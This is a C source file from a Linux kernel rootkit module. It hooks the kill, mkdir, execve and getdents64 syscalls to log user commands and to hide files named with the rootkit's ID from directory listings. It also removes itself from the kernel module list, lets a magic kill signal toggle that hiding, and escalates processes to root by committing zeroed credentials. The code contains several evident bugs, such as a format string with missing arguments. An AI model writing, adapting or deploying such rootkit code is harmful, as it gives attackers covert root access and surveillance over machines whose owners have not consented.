/*===============================================*\
  all hooked syscalls and complimentary functions
\*===============================================*/
#include <linux/pid.h>
#include "hooked_syscalls.h"

extern int BUFFER_SIZE;

struct trusted_pid_node_t{
	int pid;
	struct trusted_pid_node_t *next;
};
struct trusted_pid_node_t *trusted_pid_head;


static int init_trusted_pid_head(void){
	trusted_pid_head = (struct trusted_pid_node_t *) kmalloc(sizeof(struct trusted_pid_node_t), GFP_KERNEL);
	trusted_pid_head->pid = NULL;
	trusted_pid_head->next = NULL;
	return 0;
}

static int trust_pid(int pid){
	struct trusted_pid_node_t *current_pid;
	struct trusted_pid_node_t *next_pid;
	current_pid = trusted_pid_head;
	if (current_pid->pid==NULL){
		current_pid->pid = pid;
		return 0;
	}
	else if (current_pid->pid==pid){
		return 1;
	}
	while (current_pid->next != NULL) {
		if (current_pid->pid==pid){
			return 1;
		}
  	next_pid = current_pid->next;
		current_pid = next_pid;
  }
	current_pid->next = (struct trusted_pid_node_t *) kmalloc(sizeof(struct trusted_pid_node_t), GFP_KERNEL);
  current_pid->next->pid = pid;
  current_pid->next->next = NULL;
	return 0;
}

static int untrust_pid(int pid){
	struct trusted_pid_node_t *current_pid;
	struct trusted_pid_node_t *next_pid;
	current_pid = trusted_pid_head;
	if (current_pid->pid==pid){
		current_pid->pid=NULL;
		return 0;
	}
	struct trusted_pid_node_t *previous_pid;
	while(current_pid!=NULL){
		if (current_pid->pid==pid){
			previous_pid->next = current_pid->next;
			return 0;
		}
		previous_pid = current_pid;
		next_pid = current_pid->next;
		current_pid = next_pid;
	}
	return 1;
}

static bool check_pid_trusted(int pid){
	struct trusted_pid_node_t *current_pid;
	struct trusted_pid_node_t *next_pid;
	current_pid = trusted_pid_head;
	while(current_pid!=NULL){
		if (current_pid->pid==pid){
			return true;
		}
		next_pid = current_pid->next;
		current_pid = next_pid;
	}
	return false;
}

static int list_trusted_pids(char *buffer){
	struct trusted_pid_node_t *current_pid;
	struct trusted_pid_node_t *next_pid;
	current_pid = trusted_pid_head;
	sprintf(buffer, "[hooked_syscalls.c::list_trusted_pids] trusted pids: ");
	printk("[rootkit][hooked_syscalls.c::list_trusted_pids] trusted PIDS:\n"); //DEBUG
	while (current_pid != NULL) {
		printk("            %i\n", current_pid->pid); //DEBUG
		sprintf(buffer, "%s %i", buffer, current_pid->pid);
		next_pid = current_pid->next;
		current_pid = next_pid;
  }
	sprintf(buffer, "%s\n", buffer);
	log_msg(buffer);
	return 0;
}



static int hide_rootkit(bool hide){
	if (hide && !module_hidden){
		prev_module = THIS_MODULE->list.prev; //sets the location of the previous_pid module so rootkit can re-insert itself
		list_del(&THIS_MODULE->list); //deletes this module from the list
		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
		module_hidden^=1;
	}
	else if (!hide && module_hidden){
		list_add(&THIS_MODULE->list, prev_module); //adds module back into lkm list
		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been hidden\n");
		module_hidden^=1;
	}
	return 0;
}

static int set_root(void){
	struct cred *root_creds;
	root_creds = prepare_creds(); //initialises the root creds

	if (root_creds == NULL){ //if root creds not initialised properly
		return -1;
	}
	//sets all of the values to 0 for root
	root_creds->uid.val = root_creds->gid.val = 0;
	root_creds->euid.val = root_creds->egid.val = 0;
	root_creds->suid.val = root_creds->sgid.val = 0;
	root_creds->fsuid.val = root_creds->fsgid.val = 0;

	commit_creds(root_creds); //commits new credentials
	return 0;
}



static asmlinkage long hooked_kill(const struct pt_regs *regs){
	char buffer[BUFFER_SIZE];
	int pid = regs->di; //gets ID of process to be killed from pt_regs structure
	int sig = regs->si; //gets signal from pt_regs structure
	if ((sig<10||sig==19||sig==18||sig==30)&&!(check_pid_trusted(pid))){ //if interesting kill signal
		sprintf(buffer, "[hooked_syscalls.c::hooked_kill] process %i sent signal %i\n", pid, sig);
	}
	if (sig==64){ //DEBUG in case lkm is hidden and issues with remote access
		hide_rootkit(!module_hidden);
		return 0;
	}
	log_msg(buffer);
	return sys_kill.orig_syscall(regs); //kills process and returns result
}

static asmlinkage long hooked_mkdir(const struct pt_regs *regs){
	char buffer[BUFFER_SIZE];
	char dir_name[NAME_MAX] = {0};
	char __user *pathname = (char *)regs->di; //gets name of directory
	int mode = (int)regs->si; //gets mkdir mode

	long error =  strncpy_from_user(dir_name, pathname, NAME_MAX); //copies pathname from userspace to kernelspace
	if (error>0){ //if sucsessfuly copied
		sprintf(buffer, "[hooked_syscalls.c::hooked_mkdir] directory \"%s\" created in mode 0x%x\n", dir_name, mode);
	}
	else{
		sprintf(buffer, "[hooked_syscalls.c::hooked_mkdir] directory with name unable to be copied created in mode 0x%x\n", mode);
	}
	log_msg(buffer);
	return sys_mkdir.orig_syscall(regs); //executes original syscall
}

static asmlinkage long hooked_execve(const struct pt_regs *regs){
	char buffer[BUFFER_SIZE];
	char filename[NAME_MAX];
	char args[BUFFER_SIZE];
	memset(&filename, 0, NAME_MAX);
	memset(&args, 0, BUFFER_SIZE);

	char __user *filename_user = (char *)regs->di; //gets userspace filename
	char __user *args_user = (char *)regs->si; //gets userspace args
	int pid = pid_nr(get_task_pid(current, PIDTYPE_PID));
	long err1 =  strncpy_from_user(filename, filename_user, NAME_MAX); //copies filename from userspace to kernelspace
	long err2 = strncpy_from_user(args, args_user, BUFFER_SIZE); //copies filename from userspace to kernelspace
	if (err1>0&&err2>0){ //if sucsessfuly copied
		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] %s %s    with pid %i\n", filename, pid);
	}
	else{
		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] unable to copy command- err1: %i    err2: %i\n", err1, err2); //copy message to buffer
	}
	log_msg(buffer);
	return sys_execve.orig_syscall(regs); //executes original syscall
}

static asmlinkage long hooked_getdents64(const struct pt_regs *regs){
	char buffer[BUFFER_SIZE];
	struct linux_dirent64 *previous_pid_dir, *current_pid_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si; //gets the userspace dirent structure from regs
	int ret = sys_getdents64.orig_syscall(regs); //gets the directory listing from  original getdents64
	unsigned long offset = 0; //offset for loop
	dirent_ker = kzalloc(ret, GFP_KERNEL); //allocates memory and zeroes out for kernelspace dirent

	if (ret <= 0 || dirent_ker==NULL){ //if neither above failed
        return ret;
	}
	int err;
  err = copy_from_user(dirent_ker, dirent, ret); //copy dirent from userspace in dirent_ker
  if(err){ //if error copying from userspace
		kfree(dirent_ker);
    return ret; //return original result
	}

	while(offset<ret){ //loops through all of the directies
		//hides all files/directories beginning with rootkit_id
    current_pid_dir = (void *)dirent_ker + offset; //goes to next_pid directory

    if ( strstr(current_pid_dir->d_name, ROOTKIT_ID) != NULL){ //Compare the first bytes of current_pid_dir->d_name to rootkit id
			sprintf(buffer,"[hooked_syscalls.c::hooked_getdents64] hiding %s\n", current_pid_dir->d_name);
			log_msg(buffer);

			if (current_pid_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
				ret -= current_pid_dir->d_reclen; //decrements ret
				memmove(current_pid_dir, (void *)current_pid_dir + current_pid_dir->d_reclen, ret); //shifts all structs up in memory
        continue;
			}
			previous_pid_dir->d_reclen += current_pid_dir->d_reclen; //hide entry by incrimenting length of previous_pid entry, "swallowing" the entry
    }
		else{
			previous_pid_dir = current_pid_dir; //sets previous_pid directory entry
		}
  	offset += current_pid_dir->d_reclen; //incriment offset by length of current_pid_dir
	}

  err = copy_to_user(dirent, dirent_ker, ret); //Copy dirent_ker back to userspace from dirent_ker
	kfree(dirent_ker);
	return ret;
}
